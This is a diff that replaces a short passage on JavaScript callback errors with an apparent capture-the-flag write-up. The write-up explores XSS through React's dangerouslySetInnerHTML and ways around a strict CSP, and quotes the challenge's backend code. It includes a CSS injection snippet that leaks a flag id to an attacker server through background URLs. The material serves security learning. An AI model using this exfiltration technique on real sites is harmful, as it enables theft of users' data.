@@ -1,9 +1,256 @@
-These two things will not cause errors.
+There is no permission check for viewing a post, it means that if we know `flagId`, we can see the content and get the flag.
 
-But when using readFile to read a file, errors may occur when reading the file; and XMLHttpRequest has onerror to catch asynchronous errors.
+The front-end codebase is small, and only one obvious vulnerability when rendering a post:
 
-To summarize:
+``` js
+{/* CSP is on, so this should be fine, right? */}
+{/* Clueless */}
+<div dangerouslySetInnerHTML={{ __html: body }}></div>
+```
 
-1. The parameters of the callback function are the same as those of the general function, and they are based on "order" rather than name, and they are not so smart.
-2. According to convention, the first parameter of the callback function is usually err, which is used to tell you whether an error has occurred (according to the first point, you can call it e, error, or fxxkingError).
-3. Although it is asynchronous, it is still possible to catch errors using try catch, but that means that an error occurred when "calling the asynchronous function".
+The project is built with React, a popular library made by Meta(Facebook). Everything you render in React will be escaped automatically(it's great for developers) unless you use a very long attribute name: `dangerouslySetInnerHTML`. As the name implies, you can set `innerHTML` via this attribute.
+
+React team chose this name on purpose, because they want you to know that this attribute is dangerous and prone to XSS.
+
+So, now we have an XSS, just do `<svg onload>` and leak the flag?
+
+Not yet, don't forget the CSP.
+
+## CSP Bypass
+
+Here is the CSP for this challenge:
+
+``` js
+app.use((req, res, next) => {
+    res.setHeader(
+        "Content-Security-Policy",
+        "script-src 'self'; object-src 'none'; base-uri 'none';"
+    );
+    if (req.session.user && users.has(req.session.user)) {
+        req.user = users.get(req.session.user);
+    }
+    next();
+});
+```
+
+You can't inject your script because of the CSP, and this CSP is quite strict. When it comes to the client-side challenge, CSP is usually a good hint. I can think of a few techniques that it's allowed from this CSP:
+
+1. CSS injection (`<style>` and image are allowed)
+2. DOM clobbering (input is not sanitized)
+3. `<meta>` tag
+4. Inject the script in same origin (`self` is allowed)
+5. `<iframe>` is allowed
+
+## First thoughts - CSS injection
+
+My first idea is about CSS injection.
+
+If we can inject the style into the `/home` page which renders all the posts, we can steal the `href` which is `flagId` by doing this:
+
+``` css
+a[href^="/post/0"] {
+  background: url(//myserver?c=0);
+}
+
+a[href^="/post/1"] {
+  background: url(//myserver?c=1);
+}
+
+// ...
+```
+
+But, is it possible?
+
+When the admin bot visits our URL, it's `/post/random_id`, we can inject the style on this page for sure, but when we change the location to `/home`, the injected style is cleared. It seems not work.
+
+How about iframe?
+
+I know the style won't affect the content in an iframe if it's cross-origin, how about same-origin? Can we affect the style of an same-origin iframe? Although I think it's not possible, I still spent some times to explore this option. But, this way also not work in the end.
+
+## Other approaches
+
+DOM clobbering seems useless here, becasue I have never seen any DOM clobbering gadgets for React. Also, this React app uses no global variable.
+
+How about `meta` tag?
+
+I have seen some challenges abusing `<meta>` tag to do redirection and use `Referer` header to leak the URL, is it useful here? Probably not. Because it's meaningless to leak the URL here unless the admin bot clicks the post. I also checked the spec for `meta` tag to find is there are any unknown attributes, and found nothing in the end.
+
+How about XSLeaks? Can we leak the `href`?
+
+I tried to recall all the XSLeaks challenges I have seen, and I thought XSLeaks is also not helpful for this challenge. The reason is simple, how can we leak the `href` attribute? If the `flagId` is shown on the page, maybe we can try to leak it, but `flagId` is not even shown on the page, not possible to leak it.
+
+After thinking of so many ways but finding nothing useful, I decided to move my focus back to the `script` element.
+
+## self script
+
+I thought that maybe there is an API in back-end which outputs arbitrary content so that I can use that API as a source of script, like JSONP. It's allowed because it's same-origin. For example, `<script src="/apis/example?content=alert(1)">`
+
+By the way, loads a script via `innerHTML` is useless because the script won't get executed according to the [spec](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations).
+
+So we need to use `<iframe srcdoc>`, like this: `<iframe srcdoc="<script src='...'>"></iframe>`
+
+Here are all the APIs in the back-end:
+
+```js
+app.post("/api/login", (req, res) => {
+    let { user, pass } = req.body;
+    if (
+        !user ||
+        !pass ||
+        typeof user !== "string" ||
+        typeof pass !== "string"
+    ) {
+        return res.json({
+            success: false,
+            error: "Missing username or password",
+        });
+    }
+
+    if (!users.has(user)) {
+        return res.json({
+            success: false,
+            error: "No user exists with that username",
+        });
+    }
+
+    if (users.get(user).pass !== sha256(pass)) {
+        return res.json({ success: false, error: "Invalid password" });
+    }
+
+    req.session.user = user;
+    res.json({ success: true });
+});
+
+app.post("/api/register", (req, res) => {
+    let { user, pass } = req.body;
+    if (
+        !user ||
+        !pass ||
+        typeof user !== "string" ||
+        typeof pass !== "string"
+    ) {
+        return res.json({
+            success: false,
+            error: "Missing username or password",
+        });
+    }
+
+    if (user.length < 5 || pass.length < 7) {
+        return res.json({
+            success: false,
+            error: "Please choose a longer username or password",
+        });
+    }
+
+    if (users.has(user)) {
+        return res.json({
+            success: false,
+            error: "A user exists with that username",
+        });
+    }
+
+    req.session.user = user;
+    users.set(user, {
+        pass: sha256(pass),
+        posts: [],
+    });
+
+    res.json({ success: true });
+});
+
+const requiresLogin = (req, res, next) =>
+    req.user
+        ? next()
+        : res.json({ success: false, error: "You must be logged in!" });
+
+app.post("/api/create", requiresLogin, (req, res) => {
+    if (req.session.user === "admin") {
+        return res.json({ success: false, error: "uhhhhh... no" });
+    }
+
+    let { title, body } = req.body;
+    if (
+        !title ||
+        !body ||
+        typeof title !== "string" ||
+        typeof body !== "string"
+    ) {
+        return res.json({ success: false, error: "Missing title or body" });
+    }
+
+    let id = crypto.randomBytes(6).toString("hex");
+
+    posts.set(id, { id, title, body });
+    req.user.posts.push(id);
+
+    res.json({ success: true });
+});
+
+app.post("/api/posts", requiresLogin, (req, res) => {
+    return res.json({
+        success: true,
+        data: req.user.posts.map((id) => posts.get(id)),
+    });
+});
+
+app.get("/api/post/:id", requiresLogin, (req, res) => {
+    let { id } = req.params;
+    if (!id) {
+        return res.json({ success: false, error: "No id provided" });
+    }
+    if (!posts.has(id)) {
+        return res.json({
+            success: false,
+            error: "No post was found with that id",
+        });
+    }
+    return res.json({ success: true, data: posts.get(id) });
+});
+
+app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
+```
+
+There are only two endpoints for `GET`:
+
+``` js
+app.get("/api/post/:id", requiresLogin, (req, res) => {
+    let { id } = req.params;
+    if (!id) {
+        return res.json({ success: false, error: "No id provided" });
+    }
+    if (!posts.has(id)) {
+        return res.json({
+            success: false,
+            error: "No post was found with that id",
+        });
+    }
+    return res.json({ success: true, data: posts.get(id) });
+});
+
+app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
+```
+
+The first one is rendered with `res.json`, so its content type is `application/json`, impossible to make it a valid script. The second one is for rendering static files, which are also useless.
+
+How about other script types?
+
+## Other script types
+
+I wrote a post about different script types: [How much do you know about script type? ](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/).
+
+Besides normal scripts, there are a few unpopular types:
+
+1. webbundle
+2. importmap
+3. speculationrules
+
+For `webbundle`, you can load a `wbn` file and specify resources. When the browser wants to load these resources, it loads from `wbn` file first instead of sending a request to the server.
+
+``` html
+<script type="webbundle">
+{
+   "source": "https://example.com/dir/subresources.wbn",
+   "resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
+}
+</script>
+```
